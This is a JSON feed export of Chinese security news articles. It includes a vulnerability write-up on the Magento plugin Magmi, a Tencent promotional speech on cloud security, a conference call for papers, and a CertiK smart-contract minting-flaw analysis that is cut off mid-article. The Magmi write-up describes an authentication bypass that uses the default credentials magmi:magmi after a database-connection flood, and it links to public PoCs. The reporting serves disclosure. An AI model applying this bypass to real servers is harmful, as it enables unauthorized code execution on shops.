{"code":1,"isDone":false,"toInsertArticleList":[{"createdTime":"2020-09-05 15:30:56","updatedTime":"2020-09-05 15:30:56","title":"CVE-2020-5776/5777：Magento插件多安全漏洞分析","link":"https://www.4hou.com/posts/53vR","description":"<p>Magento是Adobe公司旗下一个功能丰富的专业开源电子商务解决方案，为商家提供一个外观、内容和功能的完全灵活控制。Magento直观的管理界面包含强大的营销、商品推销和内容管理工具，使商家能够创建适合其独特业务需求的站点。Magento号称宇宙最强企业终极电子商务解决方案。<br/></p><p style=\"text-align: center;\"><img src=\"https://img.4hou.com/uploads/ueditor/php/upload/image/20200902/1599038928102163.png\"/></p><p>Magmi是用PHP语言编写的Magento插件，用作Magento数据库客户端，可以向目录中增加商品数量或进行更新。Tenable研究人员在Magento插件Magmi中发现了2个安全漏洞。</p><p><span style=\"font-size: 20px;\"><strong>漏洞分析</strong></span></p><p><strong>CVE-2020-5776</strong></p><p>CVE-2020-5776漏洞是MAGMI插件中的CSRF（跨站请求伪造）漏洞，漏洞产生的原因是MAGMI的GET和POST端点没有进行CSRF保护，比如使用随机的CSRF token。攻击者利用该漏洞可以执行CSRF攻击，比如诱使Magento管理员点击攻击者用来认证MAGMI的恶意链接。此外，攻击者还可以劫持管理员的会话，在服务器上执行任意代码。</p><p style=\"text-align: center;\"><img src=\"https://img.4hou.com/uploads/ueditor/php/upload/image/20200902/1599038928691632.png\"/></p><p><strong>CVE-2020-5777</strong></p><p>CVE-2020-5777是一个认证绕过漏洞，漏洞产生的原因是存在使用默认凭证的fallback降级机制，漏洞影响MAGMI v0.7.23版本及更早版本。</p><p>MAGMI使用HTTP基本认证，并对Magento数据库的admin_user表的用户名和密码进行检查。如果连接到Magento数据库失败，MAGMI就会接受默认凭证magmi:magmi。因此，攻击者可以通过数据库DoS（DB- DoS）攻击来迫使数据库连接失败，然后用默认凭证来认证MAGMI。</p><p>攻击者利用该漏洞可以在受害者设备上进行远程代码执行。研究人员在测试过程中满足以下条件时成功执行了Magento DB- DoS攻击：同时发生的最大MySQL连接数大于同时发生的最大Apache HTTP连接数。通过发送超过MySQL连接数限制、同时小于apache HTTP连接限制的最大值，攻击者就可以临时拦截对Magento数据库的访问，并同时用默认凭证发起到MAGMI 的认证请求。</p><p>MySQL的连接限制通过变量max_connections来定义，默认是151。可以通过连接到MySQL实例和执行如下数据库查询来检查该值：</p><pre class=\"brush:html;toolbar:false;\">SHOW&#160;VARIABLES&#160;LIKE&#160;&#34;max_connections&#34;</pre><p style=\"text-align: center;\"><img src=\"https://img.4hou.com/uploads/ueditor/php/upload/image/20200902/1599038929117765.png\"/></p><p>Apache HTTP连接限制位于Apache Multi-Processing Module (MPM)配置的“MaxRequestWorkers” (MaxClients 或 pm.max_children)中。<br/></p><p style=\"text-align: center;\"><img src=\"https://img.4hou.com/uploads/ueditor/php/upload/image/20200902/1599038929138133.png\"/></p><p>研究人员测试过程中发现，从Apache v2.4.10版本开始，默认值为400或250。在之前的版本中，默认值为150，小于MySQL的默认max_connections。</p><p style=\"text-align: center;\"><img src=\"https://img.4hou.com/uploads/ueditor/php/upload/image/20200902/1599038933146830.png\"/></p><p><strong>PoC</strong></p><p>研究人员在GitHub上公布的漏洞的PoC代码，参见：</p><p><a href=\"https://github.com/tenable/poc/tree/master/MAGMI/cve-2020-5777\">https://github.com/tenable/poc/tree/master/MAGMI/cve-2020-5777</a> </p><p><a href=\"https://github.com/tenable/poc/tree/master/MAGMI/cve-2020-5776\">https://github.com/tenable/poc/tree/master/MAGMI/cve-2020-5776</a></p><p><strong>厂商回应</strong></p><p>Tenable研究人员在6月3日将漏洞详情报告给了MAGMI插件开发者。随后于6月17日和7月6日分别收到反馈称漏洞正在修复中，随后没有反馈。8月30日，开发者在发布的插件新版本中修复了CVE-2020-5777漏洞，但CVE-2020-5776漏洞至今仍没有修复。</p>","descriptionType":"text/html","publishedDate":"Thu, 03 Sep 2020 03:00:00 +0000","feedId":6942,"bgimg":"https://img.4hou.com/uploads/ueditor/php/upload/image/20200902/1599038928102163.png","linkMd5":"2184c32448c38dcf20754011036d1b8a","bgimgJsdelivr":"https://cdn.jsdelivr.net/gh/myreaderx24/cdn51@2020_1/2020/09/05/07-31-05-705_f400401f99dc795e.webp","destWidth":1005,"destHeight":562,"sourceBytes":49075,"destBytes":61418,"author":"ang010ela","articleImgCdnMap":{"https://img.4hou.com/uploads/ueditor/php/upload/image/20200902/1599038928102163.png":"https://cdn.jsdelivr.net/gh/myreaderx24/cdn51@2020_1/2020/09/05/07-31-05-705_f400401f99dc795e.webp","https://img.4hou.com/uploads/ueditor/php/upload/image/20200902/1599038928691632.png":"https://cdn.jsdelivr.net/gh/myreaderx7/cdn59@2020_5/2020/09/05/07-31-19-737_8e748f86aa7fb05c.webp","https://img.4hou.com/uploads/ueditor/php/upload/image/20200902/1599038929117765.png":"https://cdn.jsdelivr.net/gh/myreaderx6/cdn95@2020_4/2020/09/05/07-31-19-291_ba44d9bbf1265e90.webp","https://img.4hou.com/uploads/ueditor/php/upload/image/20200902/1599038929138133.png":"https://cdn.jsdelivr.net/gh/myreaderx27/cdn56@2020_2/2020/09/05/07-31-21-901_a71f323aa258c641.webp","https://img.4hou.com/uploads/ueditor/php/upload/image/20200902/1599038933146830.png":"https://cdn.jsdelivr.net/gh/myreaderx25/cdn51@2020_3/2020/09/05/07-31-24-379_1a613fdc156fd449.webp"},"publishedOrCreatedDate":1599291056255},{"createdTime":"2020-09-05 15:30:56","updatedTime":"2020-09-05 15:30:56","title":"腾讯副总裁丁珂：上云是帮助企业兼顾成本、效率、安全的“最优解”","link":"https://www.4hou.com/posts/p7D1","description":"<p style=\"margin: 10px 0;text-align: justify;font-size: 14px;font-family: Calibri, sans-serif;white-space: normal;line-height: 21px\"><strong><span style=\"line-height: 21px;font-family: 楷体\">&#160;</span></strong><span style=\"text-indent: 28px; line-height: 21px; font-family: 楷体;\">9</span><span style=\"text-indent: 28px; line-height: 21px; font-family: 楷体;\">月3日-9月5日，中国历史最久、影响最大的数字经济企业级峰会——2020全球数字价值峰会在三亚召开，数百位各行业CEO、CIO、CTO齐聚一堂，探讨如何利用数字价值应对剧变的外部环境。腾讯副总裁丁珂受邀出席峰会，并发表了《战略视角重估数字时代的安全》主题演讲，从企业家战略视角出发，分享腾讯利用数字化手段助力全社会抗击疫情的实践与成果，全面阐释了数字时代的企业安全之道。</span></p><p style=\"margin: 10px 0;text-align: justify;font-size: 14px;font-family: Calibri, sans-serif;white-space: normal;line-height: 21px\"><span style=\"line-height: 21px;font-family: 楷体\"><img src=\"https://img.4hou.com/uploads/ueditor/php/upload/image/20200904/1599209227818505.png\" title=\"1599209227818505.png\" alt=\"1.png\"/></span></p><p style=\"margin: 10px 0;font-size: 14px;font-family: Calibri, sans-serif;white-space: normal;text-indent: 28px;line-height: 21px\"><span style=\"line-height: 21px;font-family: 楷体\">丁珂表示，疫情对企业经营者的挑战巨大，极大地考验企业家的战略判断力。面对数字化的浪潮，以及新基建背景下的技术变革、应用变革，如果企业能够抓住历史的机遇，就能再上一个台阶。如果误判、错失机会，很有可能就被淘汰。</span></p><p style=\"margin: 10px 0;font-size: 14px;font-family: Calibri, sans-serif;white-space: normal;text-indent: 28px;line-height: 21px\"><span style=\"line-height: 21px;font-family: 楷体\">在数字化抗击疫情的大战役里，腾讯自身业务也受到了特别大的考验。一方面，得益于腾讯过往在产业互联网的积累，医疗、教育、在线会议业务发展都非常迅猛；另一方面，新场景、新业态也会带来新的更复杂的安全问题，考验着安全技术、团队和能力储备。今年6月，腾讯安全成功护航首次上云的广交会，结合其安全场景和业务特性，打造了一套量身定制的防护体系，最终做到0安全事故。腾讯安全内容风控整体解决方案、数据安全解决方案、小程序“微应急”安全防护方案均在疫情当中起到了关键作用。</span></p><p style=\"margin: 10px 0;font-size: 14px;font-family: Calibri, sans-serif;white-space: normal;text-indent: 28px;line-height: 21px\"><span style=\"line-height: 21px;font-family: 楷体\">丁珂认为，在产业互联网时代，数字化将成为必然。随着企业业务上云和数字化进程的不断推进，信息安全问题将成为企业经营者的必答题，也是战略决策者必须关注的一把手工程。同时对于企业而言，安全既是底线问题，也将成为制约企业发展的天花板。通过“安全左移”“减少攻击面”“产业链安全”能够一定程度解决当前企业面临的安全痛点。但长远来看，企业经营者还是应当借助云平台的原生安全能力，找到兼顾成本、效率和安全的“最优解”。</span></p><p style=\"margin: 10px 0;font-size: 14px;font-family: Calibri, sans-serif;white-space: normal;text-indent: 28px;line-height: 21px\"><span style=\"line-height: 21px;font-family: 楷体\">目前腾讯安全已在云原生安全领域，为中小企业提供多款用得起、用得上、用得安心的云原生安全产品。未来，腾讯安全将继续完善云上安全解决方案，为企业的核心资产安全和业务安全保驾护航。</span></p><p style=\"margin: 10px 0;text-align: justify;font-size: 14px;font-family: Calibri, sans-serif;white-space: normal;text-indent: 28px;line-height: 21px\"><span style=\"line-height: 21px;font-family: 楷体\">以下为丁珂演讲全文：</span></p><p style=\"margin: 10px 0;text-align: justify;font-size: 14px;font-family: Calibri, sans-serif;white-space: normal;text-indent: 28px;line-height: 21px\"><span style=\"line-height: 21px;font-family: 楷体\">今天跟大家分享一下我们疫情期间看到数智化经济在疫情期间的各种表现，以及它们各行各业在极限情况下挖掘数字价值的过程。然后，我想讲一下腾讯在数字领域里面，在疫情这种极限测试下做了哪些事情。</span></p><p style=\"margin: 10px 0;text-align: justify;font-size: 14px;font-family: Calibri, sans-serif;white-space: normal;text-indent: 28px;line-height: 21px\"><span style=\"line-height: 21px;font-family: 楷体\">2020</span><span style=\"line-height: 21px;font-family: 楷体\">年是一个特别特殊的一个年份，可能有两件事情大家印象特别深，对于我来说首先是疫情，第二就是国家在应对疫情之后的一个新基建方面的规划。</span></p><p style=\"margin: 10px 0;text-align: justify;font-size: 14px;font-family: Calibri, sans-serif;white-space: normal;text-indent: 28px;line-height: 21px\"><span style=\"line-height: 21px;font-family: 楷体\">很多人了解的新基建，某种程度上是重金压在整个产业互联网的数字化基础设施的建设上了，所以今天我也是从疫情开始讲起。</span></p><p style=\"margin: 10px 0;text-align: justify;font-size: 14px;font-family: Calibri, sans-serif;white-space: normal;text-indent: 28px;line-height: 21px\"><span style=\"line-height: 21px;font-family: 楷体\">不知道大家有没有发现，疫情好像把以前不是那么迫切的数字化进程忽然按了一个加速键。疫情过程当中，相比于往年，各行业普遍的业绩数据不算太好。但是有一些新物种反而会忽然之间爆发了，你会发现这些爆发的新物种，他们有一个共同的特征：都是数字原生能力厚积薄发的表现，他们的作用不再局限于只解决“线上痛点”，而是直奔“线下痛点”。</span></p><p style=\"margin: 10px 0;text-align: justify;font-size: 14px;font-family: Calibri, sans-serif;white-space: normal;text-indent: 28px;line-height: 21px\"><span style=\"line-height: 21px;font-family: 楷体\">这个过程除了这种疫情导致的一个爆发之外，可能也真的是会把过去消费互联网繁荣时代，在技术上面、市场上、应用上、商业模式积累的能力都一下子爆发了出来。</span></p><p style=\"margin: 10px 0;text-align: justify;font-size: 14px;font-family: Calibri, sans-serif;white-space: normal;text-indent: 28px;line-height: 21px\"><span style=\"line-height: 21px;font-family: 楷体\">这个时间是机会与挑战并存的，对于在座的CEO、CIO如果把握住这个机会，可能再大的困难就会变成了一个上台阶的非常好的时机，但是如果是错失了的话，很有可能结果非常很惨痛的。</span></p><p style=\"margin: 10px 0;text-align: justify;font-size: 14px;font-family: Calibri, sans-serif;white-space: normal;text-indent: 28px;line-height: 21px\"><span style=\"line-height: 21px;font-family: 楷体\">下面快速分享一下两个行业案例：</span></p><p style=\"margin: 10px 0;text-align: justify;font-size: 14px;font-family: Calibri, sans-serif;white-space: normal;text-indent: 28px;line-height: 21px\"><span style=\"line-height: 21px;font-family: 楷体\">第一，餐饮文旅业，大家是不是了解说从二月份开始就有1.3万家餐饮企业注销了，这个企业曾经上过热搜，就是西贝。有没有印象前段时间因为现金流的问题，西贝只能活三个月，现在感觉到他们的生意恢复得很好，是不是很好奇它在疫情之间做了什么？</span></p><p style=\"margin: 10px 0;text-align: justify;font-size: 14px;font-family: Calibri, sans-serif;white-space: normal;text-indent: 28px;line-height: 21px\"><span style=\"line-height: 21px;font-family: 楷体\">这个过程腾讯有幸参与了一下，他们是数字化积累比较早的，疫情期间做了一个应急应用，西贝旗下两千多家门店的客户经理通过微信跟企业微信连接了九万多名的客户，还借助微信小程序商城为客户提供了食材订购以及线下送餐服务，整个疫情期间西贝线上营收占总营收的80%左右，反而对于他们来说挺过了一个风险，未来发展迎接到了一个新的台阶。</span></p><p style=\"margin: 10px 0;text-align: justify;font-size: 14px;font-family: Calibri, sans-serif;white-space: normal;text-indent: 28px;line-height: 21px\"><span style=\"line-height: 21px;font-family: 楷体\">第二，房产中介行业，这个里面举的例子是贝壳，其实18年贝壳左晖提出了把看房这些活动转到线上，受到了很多质疑。但是，今天我们可以看到，贝壳用大量的数字化手段改变了传统中介行业，而且受到了资本市场和客户的一致认可。</span></p><p style=\"margin: 10px 0;text-align: justify;font-size: 14px;font-family: Calibri, sans-serif;white-space: normal;text-indent: 28px;line-height: 21px\"><span style=\"line-height: 21px;font-family: 楷体\">贝壳跟腾讯一起做的线上VR看房，2019年就给看房客户提供了上亿次的服务，整个疫情期间这个功能发挥了特别大的作用，今年Q2平均每天是16万次的带看，同比增长了13倍。</span></p><p style=\"margin: 10px 0;text-align: justify;font-size: 14px;font-family: Calibri, sans-serif;white-space: normal;text-indent: 28px;line-height: 21px\"><span style=\"line-height: 21px;font-family: 楷体\">其实各行各业也有比较多的例子，比如说在线教育领域，比如说零售领域等等，都会有做得非常好的案例。</span></p><p style=\"margin: 10px 0;text-align: justify;font-size: 14px;font-family: Calibri, sans-serif;white-space: normal;text-indent: 28px;line-height: 21px\"><span style=\"line-height: 21px;font-family: 楷体\">大家知道我们以前主要做的是互联网沟通的工具，在消费互联网时代，我们还是以用户的产品体验著称的。但是18年的时候我们转到了产业互联网，现在这是我们的核心驱动力。</span></p><p style=\"margin: 10px 0;text-align: justify;font-size: 14px;font-family: Calibri, sans-serif;white-space: normal;text-indent: 28px;line-height: 21px\"><span style=\"line-height: 21px;font-family: 楷体\">从消费到生产产品体验的快速洞察、连通，站在各行各业的产业视角重新再看消费，有一个比较强的感触：消费互联网中，消费者对于数字化接受度是非常高的，其他产业发展的可能不算很火，有些产业甚至被消费者推着走，这又被突如其来的疫情又拉到了一个两极分化。</span></p><p style=\"margin: 10px 0;text-align: justify;font-size: 14px;font-family: Calibri, sans-serif;white-space: normal;text-indent: 28px;line-height: 21px\"><span style=\"line-height: 21px;font-family: 楷体\">腾讯其实自己在疫情里面也是要做很多事情，下面简单分享一下我们疫情期间做哪些工作一些心得。</span></p><p style=\"margin: 10px 0;text-align: justify;font-size: 14px;font-family: Calibri, sans-serif;white-space: normal;text-indent: 28px;line-height: 21px\"><span style=\"line-height: 21px;font-family: 楷体\">一个方面我们在不同的行业里面进入度不一样，各行各业都有机会，我们在医疗教育、在线会议、办公里面发展的比较好，我们在三月份全国开通医保电子凭证里面，微信大概覆盖了全国10亿参保人，我们整个疫情超过百万的老师通过腾讯课堂和微信上课，服务了全国超过上千个教育主管部门，落地了十万多个智慧学校。</span></p><p style=\"margin: 10px 0;text-align: justify;font-size: 14px;font-family: Calibri, sans-serif;white-space: normal;text-indent: 28px;line-height: 21px\"><span style=\"line-height: 21px;font-family: 楷体\">提一下腾讯会议。腾讯会议上线两个月，国内已经有超过了一千万的日活，一百多天更新20多个版本，而且同时国际化的进程上面有100多个国家的覆盖，其中我们在疫情期间也承担着比较重要的任务除了解决企业的日常的效率性问题，甚至担负国家一些重任。预告一下，腾讯会议企业版应该很快就会跟大家见面。</span></p><p style=\"margin: 10px 0;text-align: justify;font-size: 14px;font-family: Calibri, sans-serif;white-space: normal;text-indent: 28px;line-height: 21px\"><span style=\"line-height: 21px;font-family: 楷体\">讲了这么多的应用，这里面也有一个安全性的问题。</span></p><p style=\"margin: 10px 0;text-align: justify;font-size: 14px;font-family: Calibri, sans-serif;white-space: normal;text-indent: 28px;line-height: 21px\"><span style=\"line-height: 21px;font-family: 楷体\">疫情这么短时间，我们其实在疫情期间为相关部门做得各种码超过三百个，这些“码”上线速度的要求、开发形态要求都比较高，这个过程当中还涉及用户隐私跟数据安全等众多任务，不允许存在任何风险。</span></p><p style=\"margin: 10px 0;text-align: justify;font-size: 14px;font-family: Calibri, sans-serif;white-space: normal;text-indent: 28px;line-height: 21px\"><span style=\"line-height: 21px;font-family: 楷体\">所以我们曾经在里面推出了一个微应急的安全防护方案，简单到开发者通过云端可以直接的一下子部署小程序；在电商小程序里面我们可以一键打开营销风控的功能。我们现在的服务可以做到“一键合规”这种非常高的安全抗风险能力。</span></p><p style=\"margin: 10px 0;text-align: justify;font-size: 14px;font-family: Calibri, sans-serif;white-space: normal;text-indent: 28px;line-height: 21px\"><span style=\"line-height: 21px;font-family: 楷体\">那么，在腾讯产业互联网推进如此快，怎么样保证一直口碑还不错，同时还能够有一个非常好的安全防护能力？</span></p><p style=\"margin: 10px 0;text-align: justify;font-size: 14px;font-family: Calibri, sans-serif;white-space: normal;text-indent: 28px;line-height: 21px\"><span style=\"line-height: 21px;font-family: 楷体\">首先，腾讯产业互联网的整个环节里面、甚至组织架构里面，安全都是极其重要的角色，我们的安全直接面向业务的，它不是分段做的，从网络安全、PaaS安全到云安全，其实我们可以给用户提供一站式的安全能力。</span></p><p style=\"margin: 10px 0;text-align: justify;font-size: 14px;font-family: Calibri, sans-serif;white-space: normal;text-indent: 28px;line-height: 21px\"><span style=\"line-height: 21px;font-family: 楷体\">其次，受益于长期的人才培养跟人才积累。讲一个观点，安全不只是企业发展的底线，更将成为制约企业发展的天花板。如果未来企业要用数字建一座数字大厦的话，那么安全则决定着数字大厦可以盖多高。</span></p><p style=\"margin: 10px 0;text-align: justify;font-size: 14px;font-family: Calibri, sans-serif;white-space: normal;text-indent: 28px;line-height: 21px\"><span style=\"line-height: 21px;font-family: 楷体\">简单分享一下我们疫情期间的启发，主要讲一讲未来可能面临哪些问题？</span></p><p style=\"margin: 10px 0;text-align: justify;font-size: 14px;font-family: Calibri, sans-serif;white-space: normal;text-indent: 28px;line-height: 21px\"><span style=\"line-height: 21px;font-family: 楷体\">大家在谈企业上云的时候，只要一上去想下来都难，大家不想被迫结束上云的过程。这个过程需要形成非常好的习惯，比如定期对抗演练等，然后能够有一些整体化的安全服务。</span></p><p style=\"margin: 10px 0;text-align: justify;font-size: 14px;font-family: Calibri, sans-serif;white-space: normal;text-indent: 28px;line-height: 21px\"><span style=\"line-height: 21px;font-family: 楷体\">另外就是未来的供应链的安全，我相信在CIO及企业其他高管的带领下，企业对自身的安全重视会很快上升，但是别忘了我们还是连接的社会，我们还跟这么多的周边企业打交道，怎么样保证供应链的安全可能未来大家共同面对的话题。</span></p><p style=\"margin: 10px 0;text-align: justify;font-size: 14px;font-family: Calibri, sans-serif;white-space: normal;text-indent: 28px;line-height: 21px\"><span style=\"line-height: 21px;font-family: 楷体\">上云现在是大趋势，因为可以降低企业用云成本，但我不希望云计算成为大家眼里的低价的便宜货，而是要不断挖掘其中的数据价值，并且要把安全作为一把手工程，这样的企业才会走得更远。企业借助云平台的原生安全能力，保障资产安全和业务安全，是兼顾效率、成本和安全的“最优解”。</span></p><p style=\"margin: 10px 0;text-align: justify;font-size: 14px;font-family: Calibri, sans-serif;white-space: normal;text-indent: 28px;line-height: 21px\"><span style=\"line-height: 21px;font-family: 楷体\">在云安全方面，腾讯已经取得了1500多项技术专利，位列行业第一。今年上半年，我们在云基础安全和云业务安全上的能力，获得了Gartner、Forrester、IDC、Sullivan等国际权威安全机构的认可。我们还获得了韩国、新加坡、美国、欧盟四个国家和地区的最高安全资质认证，守护腾讯云超过百万的客户。</span></p><p style=\"margin: 10px 0;text-align: justify;font-size: 14px;font-family: Calibri, sans-serif;white-space: normal;text-indent: 28px;line-height: 21px\"><span style=\"line-height: 21px;font-family: 楷体\">总之，产业互联网时代，信息安全已经成为我们的共同关切，也是企业经营所绕不开的必答题，非常期待和大家能够有机会做更深入的探讨，共建数字时代的安全堡垒。</span></p><p style=\"margin: 10px 0;text-align: justify;font-size: 14px;font-family: Calibri, sans-serif;white-space: normal;text-indent: 28px;line-height: 21px\"><span style=\"line-height: 21px;font-family: 楷体\">谢谢大家！</span></p><p style=\"margin: 10px 0;text-align: justify;font-size: 14px;font-family: Calibri, sans-serif;white-space: normal;text-indent: 28px;line-height: 21px\"><span style=\"line-height: 21px;font-family: 楷体\">「关于云原生安全更详细的探讨和实践案例分享，还请关注9月11日举办的腾讯全球数字生态大会 ·CSS峰会，邀您共启安全新思维。」</span></p><p style=\";text-align: center;font-size: 14px;font-family: Calibri, sans-serif;white-space: normal\"><span style=\"font-size: 16px;font-family: 宋体\"><img src=\"https://img.4hou.com/uploads/ueditor/php/upload/image/20200904/1599209241131271.png\" title=\"1599209241131271.png\" alt=\"2.png\"/></span></p><p style=\"margin: 10px 0;text-align: center;font-size: 14px;font-family: Calibri, sans-serif;white-space: normal;text-indent: 28px;line-height: 21px\"><span style=\"line-height: 21px;font-family: 楷体\">&#160;</span></p><p style=\"margin: 10px 0;text-align: justify;font-size: 14px;font-family: Calibri, sans-serif;white-space: normal;text-indent: 28px;line-height: 21px\"><span style=\"line-height: 21px;font-family: 楷体\">&#160;</span></p><p><br/></p>","descriptionType":"text/html","publishedDate":"Fri, 04 Sep 2020 08:47:38 +0000","feedId":6942,"bgimg":"https://img.4hou.com/uploads/ueditor/php/upload/image/20200904/1599209227818505.png","linkMd5":"6a3fdadb7cf1c2c2b8d99f7e0c628dc5","bgimgJsdelivr":"https://cdn.jsdelivr.net/gh/myreaderx32/cdn24@2020_1/2020/09/05/07-31-01-115_f6595ca16f2bb883.webp","destWidth":828,"destHeight":474,"sourceBytes":465273,"destBytes":43986,"author":"高坂穗乃果","articleImgCdnMap":{"https://img.4hou.com/uploads/ueditor/php/upload/image/20200904/1599209227818505.png":"https://cdn.jsdelivr.net/gh/myreaderx32/cdn24@2020_1/2020/09/05/07-31-01-115_f6595ca16f2bb883.webp","https://img.4hou.com/uploads/ueditor/php/upload/image/20200904/1599209241131271.png":"https://cdn.jsdelivr.net/gh/myreaderx11/cdn26@2020_2/2020/09/05/07-31-26-166_2886fa3c97330780.webp"},"publishedOrCreatedDate":1599291056252},{"createdTime":"2020-09-05 15:30:56","updatedTime":"2020-09-05 15:30:56","title":"【议题征集】西安“四会一节”——华山论剑•2020网络安全大会发出“西安声音”","link":"https://www.4hou.com/posts/o7BK","description":"<p style=\"text-align: left;\">9月2日，西安市政府新闻办举行西安市2020年“四会一节”新闻发布会，西安市将在西安高新区设主会场，于10月14至15日举办华山论剑·2020网络安全大会（第三届全国信息安全企业家高峰论坛暨第五届SSC安全峰会）。</p><p style=\"text-align: left;\">西安市副市长王勇出席新闻发布会。西安市科学技术局局长李志军、西安市市场监督管理局局长陈吉利、西安市大数据资源管理局局长刘军、西安市工业和信息化局二级巡视员赵平、西安市金融工作局副局长李鹏等部门负责人就媒体关心的问题进行解答，西安高新技术产业开发区管委会副主任杨华简要介绍“四会一节”筹备情况。新闻发布会由市委宣传部副部长刘新锋主持，中省市传统媒体、网络媒体以及部分境外媒体记者代表参加。</p><p style=\"text-align: left;\">西安市副市长王勇介绍，举办“四会一节”，是西安市委市政府贯彻落实习近平总书记来陕考察重要讲话精神、聚焦国家中心城市建设、聚力创新驱动、培育发展新动能和推动经济社会高质量发展的重要举措。“四会一节”的举办，正是围绕科技、金融、产业、人才四个方面各有侧重、相互补充、有机衔接、陆续展开，以促进科技、金融、产业、人才有机结合。西安将借助“四会一节”传播西安声音、展现“西安形象”，助推西安打造全球性城市IP，加快西安“创投之都”、“硬科技之都”、“区域金融中心”的建设，为谱写陕西新时代追赶超越新篇章贡献力量。</p><p style=\"text-align: left;\">西安市大数据资源管理局局长刘军在记者采访中表示，“华山论剑•2020网络安全大会（第三届全国信息安全企业家高峰论坛暨第五届SSC安全峰会）”紧紧围绕“一个核心”、“两个节点”，深入贯彻习近平总书记的网络强国战略思想，特别是关于国家网络安全工作“四个坚持”的重要指示精神，聚焦网络安全。今年是“十三五收官，十四五谋划”之年，网络安全将围绕这个历史节点，以探讨热点话题，展望安全未来为议题，以“线上+线下”的形式，邀请“政”、“商”、“研”界领军人物，以各自的视角，讲述网络安全产业发展对未来人类生产生活、社会发展、国家安全等方面产生的深远影响。</p><p style=\"text-align: left;\">2020年，在国家“新基建”与“网络强国”战略下，国家网络安全产业发展规划陆续出台。网络安全和信息化是“一体之两翼，驱动之双轮”，安全是新基建的基石，安全是发展的前提，需要同步规划、同步建设。“华山论剑•2020网络安全大会（第三届全国信息安全企业家高峰论坛暨第五届SSC安全峰会）”作为西安市“四会一节”的重大活动之一，聚焦网络安全行业，助力企业数字化升级，“两会”联合开创共赢的信息安全新未来，为国家网络强国战略提供基础保障,为进一步将西安市打造成为国家网络安全重要支撑城市，发出网络安全的“西安声音”，汇聚网络安全的“西安力量”，助推西安打造“网络安全示范城市”建设。</p><p style=\"text-align: left;\">本次大会拟定由中国信息安全测评中心、中共陕西省委网信办、陕西省公安厅指导，西安市人民政府主办，中共西安市委网信办、西安市大数据资源管理局、西安高新技术产业开发区管理委员会、中国信息产业商会信息安全产业分会、西安四叶草信息技术有限公司承办。届时拟举办大小共计10场左右活动。旨在以安全峰会为平台，汇聚各界安全力量，引领安全新方向，探究安全新未来，通过新技术、新产品、新成果等多元化交流平台，共推安全产业发展，全面贯彻落实《网络安全法》，提升全社会的网络安全能力，打赢网络强国攻坚战。</p><section><section><section><section><p style=\"text-align: left;\"><span style=\"font-size: 20px;\"><strong>议题征集进行中</strong></span></p></section></section></section></section><section><section><section><section><p style=\"text-align: left;\">华山论剑•2020网络安全大会（第三届全国信息安全企业家高峰论坛暨第五届SSC安全峰会）议题征集已正式启动（截止日期：9月10日），欢迎各界安全专家前来投稿，投稿邮箱：ssc@seclover.com，详情可查看链接：https://mp.weixin.qq.com/s/qx_yMFH4LBdIi7ngdVAsDQ</p></section></section></section></section><section><section><section><section><p style=\"text-align: left;\"><span style=\"font-size: 20px;\"><strong>全国信息安全企业家高峰论坛简介</strong></span></p></section></section></section></section><section><section><section><section><p style=\"text-align: left;\">“全国信息安全企业家高峰论坛”由中国信息安全测评中心牵头指导，迄今已成功举办两届（首届全国信息安全企业家高峰论坛在甘肃省兰州市召开，第二届在海南省海口市召开），为地方信息安全产业和全国的融合交流搭建了沟通的桥梁，为信息安全领军人物和业界精英提供了思想交汇和协同合作的平台，为构建产业界创新发展、携手共赢的信息安全产业生态起到了积极的促进作用。</p></section></section></section></section><section><section><section><section><p style=\"text-align: left;\"><span style=\"font-size: 20px;\"><strong>SSC安全峰会简介</strong></span></p></section></section></section></section><section><section><section><section><p style=\"text-align: left;\">CloverSec Security Conference（简称：SSC），SSC安全峰会于2016年创办于西安，每年举办一届，迄今为止已成功举办了四届，得到了行业充分认可和社会各界广泛关注，成为我国中西部最具盛名，影响力最大，知名度最高的网络安全峰会。进一步推动了陕西及整个西北地区的信息安全产业发展，为建设网络强省和新时代追赶超越提供有力支撑，为网络安全强国建设贡献力量。</p></section></section></section></section>","descriptionType":"text/html","publishedDate":"Fri, 04 Sep 2020 02:47:56 +0000","feedId":6942,"bgimg":"","linkMd5":"569c69b57eaf3d03a91f367031253a55","bgimgJsdelivr":"","metaImg":"","author":"四叶草安全","publishedOrCreatedDate":1599291056253},{"createdTime":"2020-09-05 15:30:56","updatedTime":"2020-09-05 15:30:56","title":"CertiK安全分析：SushiSwap仿盘 YUNO与KIMCHI智能合约漏洞或存安全隐患","link":"https://www.4hou.com/posts/QvrY","description":"<p><img src=\"https://pic.36krcnd.com/202009/02013349/14k2p3njv3hbk0yu\"/>北京时间8月31日和9月1日，CertiK安全研究团队发现Sushiswap仿盘的两个项目YUNo Finance (YUNO)与KIMCHI.finance (KIMCHI)，其智能合约均存在漏洞。如果利用该漏洞，智能合约拥有者可以无限制地增发项目对应的代币数目，导致项目金融进度通胀并最终崩溃。</p><p style=\"text-align: center;\"><img src=\"https://pic.36krcnd.com/202009/02013349/sku0pcj6irct3l2o\"/></p><p><span style=\"font-size: 20px;\"><strong>无限增发漏洞</strong></span></p><p>以Yuno项目中智能合约为例，CertiK安全研究团队对于该无限增发漏洞进行了详细分析，技术细节如下：&#160;</p><p>在Yuno项目中的MasterChef.sol智能合约第1354行中，dev方法可以允许当前拥有devaddr身份的智能合约调用者，将devaddr身份转移给另外一个地址。</p><section><img src=\"https://pic.36krcnd.com/202009/02013349/sl7mt8az6biva72j\"/></section><section>截图出自：</section><section>https://etherscan.io/address/0x450f143f1a8650fff968d890814bd5884bdc8f1d#code</section><p>下图中可以看到在智能合约1282行的mint方法是由修饰器onlyOwner进行限制，修饰器onlyOwner决定了只能是智能合约拥有者来执行这个合约。</p><section><img src=\"https://pic.36krcnd.com/202009/02013349/t8uycj2uf0f1iugn\"/></section><section><img src=\"https://pic.36krcnd.com/202009/02013349/87f3dzgqkw75bq94\"/></section><section><img 